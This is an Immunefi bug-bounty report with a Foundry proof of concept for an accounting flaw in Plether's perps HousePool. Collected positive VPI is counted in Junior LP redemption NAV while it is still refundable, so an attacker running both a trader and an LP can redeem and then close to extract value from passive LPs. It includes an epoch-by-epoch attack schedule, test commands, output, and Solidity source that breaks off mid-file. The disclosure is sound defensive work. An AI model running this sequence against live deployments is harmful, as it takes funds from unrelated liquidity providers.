# \#99569 [SC-Critical] Refundable positive VPI is counted in Junior redemption NAV, letting an exiting LP take value that remaining LPs must fund when the trader closes

**Submitted on Nov 14th 2026 at 09:31:13 UTC by @manvi for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99569
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description


## Brief / Introduction

I found that Plether lets a Junior LP redeem against positive VPI collected from an open trade even though the same trader can recover that VPI component on a later, skew-reducing close. The pool treats the opening charge as revenue for LP pricing immediately. It does not deduct the still-refundable amount from Junior NAV while the position is open. If a large Junior LP withdraws during that interval, it takes its share of the apparent revenue and leaves the remaining Junior LPs to absorb the close-time refund.

I reproduced this with two accounts under the same attacker's control: a trader and a Junior LP. The LP enters, the trader opens a long at the release's 40% skew limit, the LP redeems while that long remains open, and the trader closes at the **same oracle price**. The sequence produces a net gain for the attacker and a loss for the Junior LP that never trades or withdraws. It needs no privileged role, mispriced oracle update, or change to a production contract.

The results are not limited to a NAV calculation. In the passing tests, the close actually pays **4,800.920006 USDG** in net action rebate from the pool, and a separate passive-LP redemption receives **393.774757 USDG less** than the same shares were worth before the attack sequence. Over eight natural cycles (approximately 24 hours), the attacker gains **21,281.137251 USDG** while the passive Junior position loses **31,415.036510 USDG** of redeemable value. The PoC also includes a no-mid-exit control and a separate constant-depth experiment to isolate this issue from the already-documented VPI depth-manipulation finding.

I am reporting **Critical — direct theft of user funds** because the impact reaches the value backing passive Junior shares, not merely anticipated trading fees or yield. The actual-cash redemption test establishes that the loss can be realized as fewer USDG paid to an unrelated Junior LP. I therefore selected the program's Critical category rather than the separate High category for theft of unclaimed yield.

## Vulnerability Details

### 1. Positive VPI is recorded as revenue before it is final

On a skew-increasing open, the Engine assesses positive VPI. The Clearinghouse collects the trade cost, and `CfdEngineSettlementSidecar` records the pool's received amount as `ClaimantInflowKind.Revenue`:

```solidity
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool()).recordClaimantInflow(
            poolCashInflowAssets,
            IHousePool.ClaimantInflowKind.Revenue,
            IHousePool.ClaimantInflowCashMode.CashArrived
        );
    }
}
```

This is `CfdEngineSettlementSidecar.sol:454-463`. The important distinction is that cash has arrived, but the VPI component is **not necessarily final income**. If the position later reduces skew, the close calculation can reverse that same charge.

The test measures a **6,001.200006 USDG** positive VPI accrual on the open. Junior NAV rises by **6,001.193652 USDG** immediately (the small difference is normal concurrent accounting). Senior does not receive that VPI uplift. The charge is therefore already included in the Junior shares' withdrawal price before the trader closes.

### 2. LP reconciliation does not deduct the position's refundable positive VPI

`HousePoolAccountingLib.buildReconcileSnapshot()` starts from physical pool assets, adjusts for the marked terminal price delta, and deducts trader claims:

```solidity
uint256 terminalAssets = engineSnapshot.physicalAssets;
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
if (terminalDelta >= 0) {
    terminalAssets += uint256(terminalDelta);
} else {
    terminalLiabilities += uint256(-(terminalDelta + 1)) + 1;
}
```

There is no corresponding liability for the positive `vpiAccrued` that an open position can recover. `TerminalNavBookV2._curveInputFromEngine()` builds its marked-price valuation from position size, exact entry cost, side and the collectible cap; it does not add the refundable VPI exposure to the LP-side liability calculation.

`HousePool._settleLpEpoch()` then reconciles and uses the updated Junior principal as redemption pricing principal:

```solidity
_reconcile(accountingSnapshot, statusSnapshot);
_checkpointEngineCarryIndexes();

RedemptionPhase memory juniorPhase;
juniorPhase.pricingPrincipal = juniorPrincipal;
juniorPhase.pricingSupply = _juniorShareSupply();
```

As a result, a Junior LP can request an exit, wait for an ordinary LP epoch and receive USDG priced with that collected VPI still in Junior equity.

### 3. The same trader can reverse the VPI after the LP has exited

A skew-reducing close uses the position's lifetime accrued VPI when limiting a negative close-time VPI delta. In `CloseAccountingLib.sol:103-118`:

```solidity
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);

if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The lifetime clamp prevents the trader from receiving *more* negative VPI than its accrued positive VPI. It does not stop a different account, controlled by the same attacker, from redeeming Junior shares while that accrual is still counted in NAV.

The close planner then nets VPI against execution fees, carry and any frozen-market spread. A negative **net action amount**, rather than the full raw VPI delta, becomes the cash rebate:

```solidity
int256 actionNetAssets = cs.vpiDeltaAssets
    + int256(
        cs.executionFeeAssets + cs.frozenSpreadAssets
            + delta.pendingCarryAssets - delta.realizedCarryAssets
    );
// If actionNetAssets < 0, the absolute value is the assessed action rebate.
```

`CfdEnginePlanLib.sol:970-977` limits that assessed rebate to free pool cash. `CfdEngineSettlementSidecar.sol:621-624` then transfers the paid rebate from HousePool to the Clearinghouse and credits the trader. This is an actual cash-backed settlement, not an unrealized accounting mark.

I recorded the emitted `ActionRebateSettled` event in the final test:

| Close settlement item | USDG |
|---|---:|
| Opening positive VPI accrued | 6,001.200006 |
| VPI component reversed on close | -6,001.200006 |
| Net action rebate assessed after charges | 4,800.920006 |
| **Net action rebate actually funded by HousePool** | **4,800.920006** |
| Unfunded / waived rebate | 0.000000 |

The entire VPI **component** reverses; the **cash paid** is 4,800.920006 USDG after netting charges. This distinction matters. My impact is based on the actual combined trader/LP balances and the confirmed pool-funded payment, not on incorrectly treating the gross 6,001.200006 USDG component as an additional full cash payout.

### 4. The attack is an LP exit-timing transfer, not a VPI curve amplification

The attacker's Junior shares own a fraction `f` of the tranche. When the opening VPI is recognized as revenue, the value of those shares increases with that revenue. The attacker withdraws that value before the associated position's close-time liability is realized. The close then reduces the NAV of the Junior shares still outstanding.

The simplest economic description is: **the LP leg captures an upfront credit, while the trader leg later claims the allowable rebate; the passive LP is left with the cost.** Execution fees, carry, coupons and funding rules affect the exact result. Those costs are included in the test's participant-balance calculation, and the attack is profitable after those protocol-level charges.

The constant-depth case is useful because it eliminates the apparent alternative explanation. In that test, the pool depth before the open is **7,502,000 USDG** and before the close is **7,501,932 USDG**. The close-time **unclamped** curve would rebate approximately **6,001.254066 USDG**, versus **6,001.200006 USDG** originally accrued. That is a difference of only about 0.0009%, and the lifetime clamp applies exactly the accrued 6,001.200006 USDG. The attacker still earns **2,651.184815 USDG** in that cycle, while the pre-existing passive Junior LP loses **3,943.317971 USDG** in NAV value. The separate refilling LP in that experiment is included in the test's total honest-LP accounting.

In other words, **the exploit remains when the close-depth VPI calculation is effectively unchanged**. It comes from interim NAV ownership, not from making the curve pay more than its ordinary amount.

### 5. The complete attack fits normal LP epochs

All times below are relative to an hourly settlement boundary `E`. Requests occur before the 300-second cutoff, and the attacker observes the one-hour deposit cooldown.

| Time | Action |
|---|---|
| Before `E - 300s` | Attacker Junior LP submits a 4,250,000 USDG deposit request. |
| `E + 10s` | Permissionless keeper settles the epoch; attacker claims Junior shares. |
| After deposit activation | Attacker trader opens a roughly 3,000,700 USDG max-skew LONG at the unchanged 1.00 oracle price, paying positive VPI. The pool recognizes that VPI in Junior NAV. |
| `E + 1h + 60s` | After the cooldown, attacker Junior LP requests redemption of all freely redeemable shares. A keeper refreshes the honest mark. |
| `E + 2h + 10s` | The withdrawal epoch is settled and the attacker LP claims actual USDG at the inflated Junior redemption price. |
| Immediately afterward | The trader fully closes the LONG at the same price; the allowed negative VPI component becomes a net action rebate funded from remaining pool cash. |
| Next cycle | The attacker can re-enter and repeat. The no-refill variant completes eight cycles in 86,413 seconds. |

The attacker controls the trader, the large Junior LP and its permissionless keeper. The passive Junior depositor is independent. There is no requirement for a malicious owner, guardian, oracle publisher or protocol keeper service.

## Impact Details

I ran the full nine-test suite against the audited commit with Foundry 1.5.1. **All nine tests passed, with no skipped tests or failures.** The test uses release VPI/skew/fee/margin settings, a 40 million USDG Senior cap, an 80% Senior share cap, 750,000 USDG of initial honest Junior liquidity and 2,500,000 USDG of honest Senior liquidity. The attacker puts 4,250,000 USDG into Junior and funds its trader with 400,000 USDG margin.

### Profitable repeated extraction from passive Junior LPs

| Scenario | Attacker PnL | Honest Junior result | Relevance |
|---|---:|---:|---|
| Single constant-depth cycle | +2,651.184815 USDG | -3,943.317971 USDG for the original passive LP | Attack works with essentially unchanged VPI curve depth. |
| Eight cycles, ordinary no-refill path | **+21,281.137251 USDG** | **-31,415.036510 USDG** | Repeatable extraction in ~24 hours; average passive loss ~418 basis points/day in this test. |
| Eight cycles, constant-depth path | +21,207.049202 USDG | -31,565 USDG including the separate refilling LP (rounded test summary) | The separate constant-depth control stays profitable every cycle. |
| Eight cycles, mixed attacker Senior + Junior deposits | +21,082.145984 USDG | -31,280.175093 USDG | Holding Senior as well does not remove the Junior extraction. |
| Eight cycles, no mid-position Junior exit | **-11,528.319925 USDG** | **+1,193.105933 USDG** | With the attacker remaining in Junior until after each close, the attack is unprofitable. |

The no-mid-exit comparison is a distinct control run with its own redemption timing and close-time depth; it is not presented as an identical-depth experiment. The separate constant-depth tests are what isolate that possible confounder. In both comparisons, **exiting while refundable VPI is outstanding is the profitable step**.

The tranche choice also matters. The Senior-only test loses money for the attacker and shows that the open VPI credit lands in Junior, not Senior. The Junior-share sweep turns attacker-profitable around 44.5% ownership in the simulated pool. The exploit does not require full ownership of Junior, but it does require substantial capital and freedom to redeem at the scheduled epoch. As with other investment-heavy on-chain attacks, transaction gas and external hedging costs are not measured by this local Foundry balance test; on-chain execution charges and the test keeper's credits are included.

### Actual USDG redemption proves loss is not just an unrealized NAV mark

I separately made the passive Junior LP request redemption of a **10% slice of its freely withdrawable shares after the attack**. The test settled the following LP epoch, claimed the funded redemption and checked the actual change in the LP's USDG token balance.

| Item | USDG |
|---|---:|
| Pre-attack value of the same redeemed shares | 74,621.356904 |
| Post-attack share-NAV quote, before the final redemption epoch | 74,229.865376 |
| **USDG actually received in the wallet** | **74,227.582147** |
| **Shortfall against the pre-attack value** | **393.774757** |

Of that difference, **391.491528 USDG** is already present in the post-attack NAV quote, and **2.283229 USDG** arises between that quote and the subsequent funded redemption. I do not attribute that latter amount exclusively to VPI. The decisive fact is that the passive LP's shares lost value before redemption and it **actually received fewer USDG**, while the attacker separately realized a positive net balance gain.

The larger 31,415.036510 USDG figure in the eight-cycle test measures the passive Junior position's remaining redeemable share value. It is not described as 31,415 USDG already withdrawn from that victim's wallet. The smaller redemption test supplies direct cash-realization evidence for the same type of loss.

The loss comes from value backing existing LP shares, not just unpaid future yield. For this reason I selected the competition's **Critical: direct theft of user funds** category.

## Why This Is a Separate Issue from the Known VPI Finding

The published AI scan lists *“Temporary pool-liquidity reduction can amplify a skew-reducing close rebate.”* That report concerns changing the pool-depth denominator around a close so the calculated negative VPI becomes larger. My root cause is different: **positive VPI that can later be refunded is included in an intervening Junior redemption price without any liability offset**.

I tested that distinction directly. With opening and closing economic depth effectively equal, the calculated rebate is not artificially amplified, but the attacker still redeems the interim Junior uplift and profits. A fix that merely snapshots close-time depth or prevents deliberate liquidity-driven rebate amplification would not correct the timing of Junior NAV recognition.

`SECURITY.md` also documents the lifetime VPI clamp, including the intent to prevent extractable rebate-only round trips. This attack does not exceed the lifetime clamp. It combines a permitted trader round trip with an LP redemption occurring between the two sides of that round trip.

The accounting specification's collection-time ownership rule addresses **carry**. Collected carry is not refunded to the same trader just for closing the position. Here, the previously collected VPI can form part of a later trader rebate. The relevant distinction is not when cash entered HousePool, but whether it was already final for the LPs whose shares are being priced.

The specification currently protects negative lifetime VPI with a dedicated reserve, but does not account for the opposite, still-refundable positive VPI in redemption NAV. That omission is what makes the cross-account transfer out of passive Junior capital possible; the nine-test PoC demonstrates it through the protocol's existing settlement and redemption paths.

## Suggested Remediation

Keep the refundable portion of collected positive VPI out of redeemable LP equity until the position can no longer reclaim it. A practical approach would be to maintain an accounting liability for the still-rebatable positive VPI of open positions and deduct it in the canonical LP reconcile snapshot used by both deposit and redemption pricing. Recompute the amount on opens, increases, partial closes, full closes and liquidations, and release the portion that is no longer refundable into earned revenue.

Alternatively, defer recognition of the refundable VPI component as tranche revenue until that obligation is extinguished. Whatever accounting method is chosen, the correction must apply symmetrically to deposits and withdrawals, and it must not double-count liabilities already represented by trader claims or the terminal price book.

The relevant invariant is straightforward: **an LP must not be able to redeem cash attributed to a trader charge while an open position can still cause that charge to be paid back out of the remaining LPs' funds**.

## References

- [`CfdEngineSettlementSidecar` opening trade-cost revenue booking, lines 454-463](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L463)
- [`HousePoolAccountingLib.buildReconcileSnapshot`, lines 60-78](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L78)
- [`TerminalNavBookV2._curveInputFromEngine`, lines 418-448](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TerminalNavBookV2.sol#L418-L448)
- [`HousePool._settleLpEpoch`, lines 824-843](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L824-L843)
- [`CloseAccountingLib` accrued-VPI lifetime clamp, lines 103-118](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118)
- [`CfdEnginePlanLib` net action rebate, lines 1035-1061](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1035-L1061)
- [`CfdEnginePlanLib` paid-versus-waived cash rebate, lines 970-977](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L970-L977)
- [`CfdEngineSettlementSidecar` rebate transfer, lines 621-624](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L621-L624)
- [Published AI scan: close-depth VPI rebate amplification (different mechanism)](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md)
- [Plether release parameters](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md)
- [Plether competition scope and impact categories](https://immunefi.com/audit-competition/plether/scope/)


## Proof of Concept


I reproduced the attack at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8` with Foundry **1.5.1**. The final PoC contains nine tests. It uses `BasePerpTest`, which deploys the real in-scope pool, vault, Engine, planners and settlement sidecars and mocks external Pyth data and USDG. The test fixture's `LegacyOrderRouterHarness` provides a scalar `commitOrder` convenience function; that function translates its arguments into a V3 `OrderRequest` and delegates to the production V3 Router commit implementation. The economic execution, close settlement, tranche reconciliation and USDG redemption are not mocked. I made **no changes** to `packages/perps/src`.

**Repository:** `https://github.com/immunefi-team/audit-comp-plether`  
**Commit:** `a82d4fefb02768e5b3bddcc97dee371eee24fea8`  
**PoC file:** `packages/perps/test/perps/insight/VpiLpExitTheftPoC.t.sol`  
**Test contract:** `VpiLpExitTheftPoC`  
**SHA-256 of the exact tested `.sol` file:** `6143682b0729001bdb2ed4aea1ed8d1dba3dc991f36481e79727d17843fdf538`

## Reproduction Steps

1. Use the audited commit and Foundry 1.5.1. Save the complete Solidity source printed below to `packages/perps/test/perps/insight/VpiLpExitTheftPoC.t.sol`.
2. Run the entire PoC suite. The test fixture activates the release-style pool and creates separate honest Junior/Senior accounts, attacker Junior LP, attacker trader and keeper. The attacker starts with 4.25 million USDG of Junior liquidity and 400,000 USDG in the trader account.
3. In the single-cycle and eight-cycle attacks, observe the positive opening VPI, its recognition in Junior NAV, the attacker Junior redemption **before** the trader closes, and the later negative VPI component. Assert positive attacker PnL and negative passive Junior PnL.
4. In the constant-depth case, observe almost identical opening and closing depths and compare the *unclamped* close curve against the opening charge. The attacker still profits with no meaningful curve amplification.
5. Run the no-mid-exit control with the same attack roles and trade pattern but redeem the attacking Junior shares **after** each close. Observe that the attacker's cumulative result becomes negative.
6. Record `ActionRebateSettled` on the close. Assert a single event for the trader, a positive paid rebate, paid plus waived equaling assessed, and an actual paid amount of **4,800.920006 USDG**.
7. After a normal attack cycle, have the passive Junior LP redeem a 10% slice of withdrawable shares. Fund that request through the next LP epoch, claim the USDG, and compare the wallet balance increase with the same shares' original value. Observe a **393.774757 USDG** actual cash shortfall.
8. Confirm nine passing tests, and confirm the audited `packages/perps/src` directory has no changes.

## Commands

Run from the repository root in GitHub Codespaces or an equivalent environment with its submodules initialized:

```bash
cd /workspaces/audit-comp-plether

git rev-parse HEAD
# Required: a82d4fefb02768e5b3bddcc97dee371eee24fea8

forge --version
# Confirmed in reproduction: forge 1.5.1

git submodule update --init --recursive
mkdir -p vpi_evidence
set -o pipefail

forge test \
  --root packages/perps \
  --match-path 'test/perps/insight/VpiLpExitTheftPoC.t.sol' \
  -vv \
  2>&1 | tee vpi_evidence/all_nine_tests.log

# Inspect the two cash-realization checks with detailed traces.
forge test \
  --root packages/perps \
  --match-path 'test/perps/insight/VpiLpExitTheftPoC.t.sol' \
  --match-test 'test_Final_ActualActionRebateSettledFromPoolCash|test_Final_PassiveJuniorRealizedCashRedemptionShortfall' \
  -vvvv \
  2>&1 | tee vpi_evidence/final_cash_evidence.log

# Confirm the in-scope audited contracts were not edited.
git diff -- packages/perps/src

# Verify the exact source used for the passing run.
sha256sum packages/perps/test/perps/insight/VpiLpExitTheftPoC.t.sol
```

## Observed Console Output

The following excerpts are taken from the nine-test Codespaces execution; the pass list omits gas figures for readability. USDG uses six decimals; the raw event values are in USDG atoms.

```text
Ran 9 tests for test/perps/insight/VpiLpExitTheftPoC.t.sol:VpiLpExitTheftPoC
[PASS] test_Control_EightCycles_NoMidExit()
[PASS] test_FSweep_SingleCycle()
[PASS] test_Final_ActualActionRebateSettledFromPoolCash()
[PASS] test_Final_PassiveJuniorRealizedCashRedemptionShortfall()
[PASS] test_Mixed_SeniorPlusJuniorAttacker()
[PASS] test_PoC_EightCycles_ConstantDepth()
[PASS] test_PoC_EightCycles_Natural()
[PASS] test_PoC_SingleCycle_ConstantDepth()
[PASS] test_Senior_OnlyAttackerCapturesNothing()
Suite result: ok. 9 passed; 0 failed; 0 skipped
```

**Actual net rebate paid from HousePool:**

```text
FINAL open positive VPI (USDG atoms)                  6001200006
FINAL applied negative VPI on close (USDG atoms)    -6001200006
FINAL net rebate assessed (USDG atoms)               4800920006
FINAL net rebate actually paid from pool (USDG atoms) 4800920006
FINAL unpaid rebate waived (USDG atoms)                       0
```

**Passive Junior's actual USDG withdrawal:**

```text
FINAL passive Junior redeemed shares                     75000684906253
FINAL pre-attack value of same shares (USDG atoms)       74621356904
FINAL post-attack NAV quote (USDG atoms)                 74229865376
FINAL actual USDG received (atoms)                       74227582147
FINAL realized USDG shortfall (atoms)                      393774757
```

**Single-cycle, constant-depth attack:**

```text
attacker share of Junior f (bps)            8504
depth at open / at close (USDG)              7502000 7501932
long size (lots of 100 USDG)                 30007
VPI paid at open (atoms)                     6001200006
Junior NAV jump on open (atoms)              6001193652
close VPI delta applied (atoms)             -6001200006
close VPI unclamped @close depth            -6001254066
attacker PnL this cycle (atoms)              2651184815
honest Junior PnL this cycle (atoms)        -3943317971
```

**Eight-cycle natural-path totals, without refilling pool depth:**

```text
========== 8 cycles, attack (no refill)
cycles 8
elapsed seconds 86413
attacker cumulative PnL (USDG) 21281
honest Junior cumulative PnL (USDG) -31415
honest Senior cumulative PnL (USDG, coupon) 549
honest Junior PnL per day (bps of capital) -418
```

**Eight-cycle no-mid-exit control:**

```text
========== 8 cycles, CONTROL (LP exits after close)
cycles 8
elapsed seconds 115212
attacker cumulative PnL (USDG) -11528
honest Junior cumulative PnL (USDG) 1193
```

**Capital threshold from the share-fraction sweep:**

```text
f (bps) 4009; attacker PnL (USDG*1e6) -22066705
f (bps) 4453; attacker PnL (USDG*1e6) 112809637
f (bps) 8504; attacker PnL (USDG*1e6) 2651182412
```

The tests together show the three necessary pieces: the interim Junior share uplift, the actual pool-funded net rebate, and the victim's lower final USDG redemption. Neither the Senior-only negative control nor the no-mid-exit control produces the same profitable result.

## Complete Solidity PoC Source

**Save as:** `packages/perps/test/perps/insight/VpiLpExitTheftPoC.t.sol`

The source below is the **exact nine-test file** that passed in Codespaces, unchanged. The comments that refer to refunding “the full VPI” mean the close-side **VPI component**; the `test_Final_ActualActionRebateSettledFromPoolCash` assertion separately measures the smaller net cash rebate after fees.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdMath} from "@plether/perps/CfdMath.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {console2} from "forge-std/console2.sol";
import {Vm} from "forge-std/Vm.sol";

/// @notice PoC: refundable positive VPI is booked as Junior LP equity the moment it is charged. A skew-increasing open
///         pays VPI V into HousePool cash and Junior NAV rises by V at once, but the SAME position gets up to all of V
///         back as a rebate on its skew-reducing close (the lifetime clamp permits a refund up to the lifetime
///         accrual). A Junior LP that owns a fraction f of Junior and redeems while the position is open walks away
///         with f*V; the trader's close then pulls the full V from the REMAINING LPs.
///
///         Attacker coalition = trader account + Junior LP account + keeper account. All actions use production
///         entrypoints only (router.commitOrder / executeOrder / settleLpEpoch, juniorVault.requestDeposit /
///         claimDeposit / requestRedeem / claimRedeem). Every Pyth update is the honest constant basket price 1.00,
///         so no price selection is involved. Release risk params and the release Senior caps (40M, 80%) are used.
contract VpiLpExitTheftPoC is BasePerpTest {

    uint256 internal constant PRICE = 1e8;
    uint256 internal constant LOT = 1e20; // SIZE_QUANTUM: 100 tokens = 100 USDG at PRICE

    address internal constant TRADER = address(0xA7701);
    address internal constant ALP = address(0xA7704); // attacker Junior LP
    address internal constant KEEPER = address(0xA7705); // attacker keeper (executes its own orders / settlements)
    address internal constant SLP = address(0xA7706); // attacker Senior LP (Senior / mixed scenarios)
    address internal constant REFILL = address(0xBEEF01); // unrelated honest LP that refills depth (constant-depth runs)

    uint256 internal constant HONEST_JUNIOR = 750_000e6;
    uint256 internal constant HONEST_SENIOR = 2_500_000e6;

    // accounting
    uint256 internal attackerIn;
    uint256 internal refillIn;
    uint256 internal lastRefillRedeemId;
    bool internal refillRedeemPending;

    struct CycleOut {
        uint256 f; // attacker share of Junior supply at the open, 1e18
        uint256 depthOpen;
        uint256 depthClose;
        uint256 sizeLots;
        int256 vpiPaid; // lifetime VPI accrued at open
        int256 closeVpiDelta; // close VPI delta actually applied (negative = rebate)
        int256 unclampedCloseVpi; // CfdMath VPI at the close depth, without the lifetime clamp
        uint256 navJumpOnOpen; // Junior totalAssets increase from the open
        int256 seniorNavJumpOnOpen;
        uint256 lpRedeemed;
        uint256 refillAssets;
    }

    // ------------------------------------------------------------------
    // configuration: release params
    // ------------------------------------------------------------------

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return HONEST_JUNIOR;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return HONEST_SENIOR;
    }

    function setUp() public override {
        super.setUp();
        // Release Senior caps: 40M absolute and 80% share (the base harness disables them).
        _setSeniorCapacity(40_000_000e6, 8000);
        assertEq(engine.executionFeeBps(), 4, "release exec fee");
        assertEq(pool.maxSeniorShareBps(), 8000, "release senior share cap");
        // Move to the following Monday 10:00 UTC (no weekend / FAD inside the attack window).
        vm.warp(SETUP_TIMESTAMP + 7 days);
        vm.roll(vm.getBlockNumber() + 1);

        _mintAttacker(TRADER, 400_000e6);
        vm.startPrank(TRADER);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(TRADER, 400_000e6);
        vm.stopPrank();
        vm.prank(ALP);
        settlementToken.approve(address(juniorVault), type(uint256).max);
        vm.prank(SLP);
        settlementToken.approve(address(seniorVault), type(uint256).max);
        vm.prank(REFILL);
        settlementToken.approve(address(juniorVault), type(uint256).max);
    }

    // ------------------------------------------------------------------
    // helpers
    // ------------------------------------------------------------------

    function _now() internal view returns (uint256) {
        return vm.getBlockTimestamp();
    }

    function _warpTo(
        uint256 t
    ) internal {
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _nextEpochStart() internal view returns (uint256) {
        return (_now() / 1 hours + 1) * 1 hours;
    }

    function _mintAttacker(
        address a,
        uint256 amt
    ) internal {
        settlementToken.mint(a, amt);
        attackerIn += amt;
    }

    function _settle() internal {
        bytes[] memory upd = _mockPythUpdateData(PRICE);
        vm.prank(KEEPER);
        router.settleLpEpoch(upd);
    }

    /// @dev Permissionless keeper mark refresh (router.updateMarkPrice) with the honest constant price. LP deposits
    ///      require a fresh mark while positions are open.
    function _pokeMark() internal {
        bytes[] memory upd = _mockPythUpdateData(PRICE);
        vm.prank(KEEPER);
        router.updateMarkPrice(upd);
    }

    function _executeHead() internal {
        uint64 id = router.nextExecuteId();
        bytes[] memory upd = _mockPythUpdateData(PRICE);
        vm.prank(KEEPER);
        router.executeOrder(id, upd);
    }

    function _netDepth() internal view returns (uint256) {
        return pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
    }

    function _attackerValue() internal view returns (uint256 v) {
        address[4] memory all = [TRADER, ALP, KEEPER, SLP];
        for (uint256 i = 0; i < 4; ++i) {
            v += settlementToken.balanceOf(all[i]);
            v += clearinghouse.balanceAssets(all[i]);
            v += engine.traderClaimBalanceAssets(all[i]);
        }
        v += juniorVault.convertToAssets(juniorVault.balanceOf(ALP));
        v += seniorVault.convertToAssets(seniorVault.balanceOf(SLP));
    }

    function _attackerPnl() internal view returns (int256) {
        return int256(_attackerValue()) - int256(attackerIn);
    }

    function _honestJuniorValue() internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
    }

    function _honestSeniorValue() internal view returns (uint256) {
        return seniorVault.convertToAssets(seniorVault.balanceOf(address(this)));
    }

    function _refillValue() internal view returns (uint256 v) {
        v = settlementToken.balanceOf(REFILL) + juniorVault.convertToAssets(juniorVault.balanceOf(REFILL));
        if (refillRedeemPending) {
            v += juniorVault.convertToAssets(juniorVault.pendingRedeemRequest(lastRefillRedeemId, REFILL));
            v += juniorVault.claimableRedeemAssets(lastRefillRedeemId, REFILL);
        }
    }

    function _refillPnl() internal view returns (int256) {
        return int256(_refillValue()) - int256(refillIn);
    }

    /// @dev Honest Junior = the pre-existing passive Junior LP plus the unrelated refill LP (if any).
    function _honestJuniorPnl(
        uint256 honestJ0
    ) internal view returns (int256) {
        return int256(_honestJuniorValue()) - int256(honestJ0) + _refillPnl();
    }

    function _claimRefillRedeemIfAny() internal {
        if (!refillRedeemPending) {
            return;
        }
        uint256 cs = juniorVault.claimableRedeemRequest(lastRefillRedeemId, REFILL);
        if (cs > 0) {
            vm.prank(REFILL);
            juniorVault.claimRedeem(lastRefillRedeemId, cs, REFILL, REFILL);
        }
        assertEq(juniorVault.pendingRedeemRequest(lastRefillRedeemId, REFILL), 0, "refill exit fully funded");
        refillRedeemPending = false;
    }

    function _openMaxSkewLong() internal returns (uint256 lots) {
        // Largest whole-lot long that keeps post-open skew within maxSkewRatio (40%) of net pool depth.
        lots = (_netDepth() * 4 / 10) / 100e6 - 1;
        vm.prank(TRADER);
        router.commitOrder(CfdTypes.Side.LONG, lots * LOT, 60_000e6, 0, false);
        _executeHead();
        (uint256 sz,,,,,,) = engine.positions(TRADER);
        assertEq(sz, lots * LOT, "open filled");
    }

    function _closeLong(
        uint256 lots
    ) internal returns (int256 vpiDelta, int256 unclamped, uint256 depth) {
        vm.prank(TRADER);
        router.commitOrder(CfdTypes.Side.LONG, lots * LOT, 0, 0, true);
        depth = _netDepth();
        ICfdEngineTypes.ClosePreview memory p = engineLens.previewClose(TRADER, lots * LOT, PRICE);
        assertTrue(p.valid, "close preview valid");
        vpiDelta = p.vpiDeltaAssets;
        unclamped = CfdMath.calculateVPI((lots * LOT * PRICE) / 1e20, 0, depth, 0.01e18);
        _executeHead();
        (uint256 sz,,,,,,) = engine.positions(TRADER);
        assertEq(sz, 0, "close filled");
    }

    // ------------------------------------------------------------------
    // one cycle
    // ------------------------------------------------------------------

    /// @dev Precondition: no open position, ALP holds no Junior shares, and `_now()` is before the imminent cutoff.
    ///      exitMid = attack (ALP redeems while the position is open); !exitMid = control (ALP redeems after the close).
    ///      refill = an unrelated LP deposits in the exit epoch so that pool depth at the close equals depth at the
